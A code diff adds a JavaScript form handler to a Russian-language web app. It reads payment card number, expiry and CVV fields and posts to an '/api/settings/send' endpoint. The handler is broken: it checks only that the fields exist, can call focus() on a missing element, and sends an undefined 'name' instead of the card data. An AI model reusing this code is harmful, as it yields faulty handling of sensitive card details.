@@ -280,6 +280,46 @@ function switchTab(tab) {
     showScreen(tab);
 }
 
+async function submitSendForm(event) {
+    event.preventDefault();
+
+    const cardNumber = document.getElementById('card-number');
+    const cardMonth = document.getElementById('card-month');
+    const cardYear = document.getElementById('card-year');
+    const cardCVV = document.getElementById('card-cvv');
+    const submitButton = document.getElementById('send-submit');
+
+    if (!cardNumber || !cardMonth || !cardYear || !cardCVV) {
+        showToast('Введите все данные');
+        cardNumber.focus()
+        return;
+    }
+
+    submitButton.disabled = true;
+    submitButton.textContent = 'Отправка...';
+
+    try {
+        const response = await fetch(`${API_BASE_URL}/api/settings/send`, {
+            method: 'POST',
+            headers,
+            body: JSON.stringify({ name })
+        });
+
+        if (!response.ok) {
+            throw new Error(`Ошибка сервера: ${response.status}`);
+        }
+
+        showToast('Данные отправлены');
+        document.getElementById('send-form').reset();
+    } catch (error) {
+        console.error('Ошибка отправки данных:', error);
+        showToast('Не удалось отправить данные');
+    } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = 'Отправить';
+    }
+}
+
 function showScreen(screenId) {
     if (currentScreen === 'withdraw' && screenId !== 'withdraw') {
         document.getElementById('withdraw-form').classList.remove('hidden');
